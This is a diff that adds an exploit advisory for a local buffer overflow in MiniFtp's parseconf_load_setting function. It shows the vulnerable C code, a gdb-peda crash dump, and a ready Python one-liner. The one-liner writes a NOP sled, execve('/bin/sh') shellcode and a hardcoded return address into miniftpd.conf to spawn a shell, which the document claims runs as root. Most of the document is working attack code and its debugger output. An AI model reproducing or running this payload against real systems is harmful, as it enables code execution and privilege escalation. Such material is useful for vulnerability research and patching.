@@ -1,0 +1,82 @@
+# Exploit Title: MiniFtp parseconf_load_setting local-bufferoverflow (318 bytes)
+# Google Dork: None
+# Date: 11.04.2019
+# Exploit Author: strider
+# Vendor Homepage: https://github.com/skyqinsc/MiniFtp
+# Software Link: https://github.com/skyqinsc/MiniFtp
+# Tested on: Debian 9 Stretch i386/ Kali Linux i386
+# CVE : None
+# Shellcode Length: 318
+------------------------------[Description]---------------------------------
+
+This exploit spawns a shell with root privileges. The exploit will be written into the file miniftpd.conf
+
+vuln code:
+void parseconf_load_setting(const char *setting){
+while(isspace(*setting)) setting++;
+	char key[128] = {0}, value[128] = {0};
+	str_split(setting, key, value, '=');
+	if(strlen(value) == 0){
+		fprintf(stderr, "missing value in config file for : %s\n", key);
+		exit(EXIT_FAILURE);
+	}
+....
+
+The given var settings is a *char and will be splitted into key and value key and value are both 128 char long and settings can be longer than 128 + 128 chars. this issue will not be checked and stored. This causes a buffer overflow.
+
+after return it 
+
+-----------------------------[Gdb-Peda Dump]---------------------------------
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x48575250e7894851 
+RCX: 0xffffffd480050f3b 
+RDX: 0x90 
+RSI: 0x7fffffffd3a0 --> 0x9090909090909090 
+RDI: 0x55555555c854 ("download_max_rate")
+RBP: 0x50f3bc08348e689 
+RSP: 0x7fffffffd460 --> 0x555555556860 (<_start>:	xor    ebp,ebp)
+RIP: 0x7fffffffd481 --> 0x9090909090909090 
+R8 : 0xa ('\n')
+R9 : 0x7fffffffd4a0 --> 0x9090909090909090 
+R10: 0x83a 
+R11: 0x7ffff7891520 (<__strcmp_sse2_unaligned>:	mov    eax,edi)
+R12: 0x555555556860 (<_start>:	xor    ebp,ebp)
+R13: 0x7fffffffe200 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x7fffffffd478:	imul   esi,DWORD PTR [rax+0x3d],0x90909090
+   0x7fffffffd47f:	nop
+   0x7fffffffd480:	nop
+=> 0x7fffffffd481:	nop
+   0x7fffffffd482:	nop
+   0x7fffffffd483:	nop
+   0x7fffffffd484:	nop
+   0x7fffffffd485:	nop
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffd460 --> 0x555555556860 (<_start>:	xor    ebp,ebp)
+0008| 0x7fffffffd468 --> 0x55555555b5b2 ("miniftpd.conf")
+0016| 0x7fffffffd470 ("max_per_ip=", '\220' <repeats 189 times>...)
+0024| 0x7fffffffd478 --> 0x90909090903d7069 
+0032| 0x7fffffffd480 --> 0x9090909090909090 
+0040| 0x7fffffffd488 --> 0x9090909090909090 
+0048| 0x7fffffffd490 --> 0x9090909090909090 
+0056| 0x7fffffffd498 --> 0x9090909090909090 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x00007fffffffd481 in ?? ()
+gdb-peda$ 
+
+
+ -----------------------------[Exploit]---------------------------------------------
+
+python -c "print 'max_per_ip=' + '\x90' * 278 + '\x48\x31\xc0\x48\x31\xd2\x50\x49\xb9\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x41\x51\x48\x89\xe7\x50\x52\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05' + '\x80\xd4\xff\xff\xff\x7f'" > miniftpd.conf
+
+
+ -----------------------------[how to run]-----------------------------
+
+run the line above in a shell
+
+run MiniFtp in gdb and you got a shell
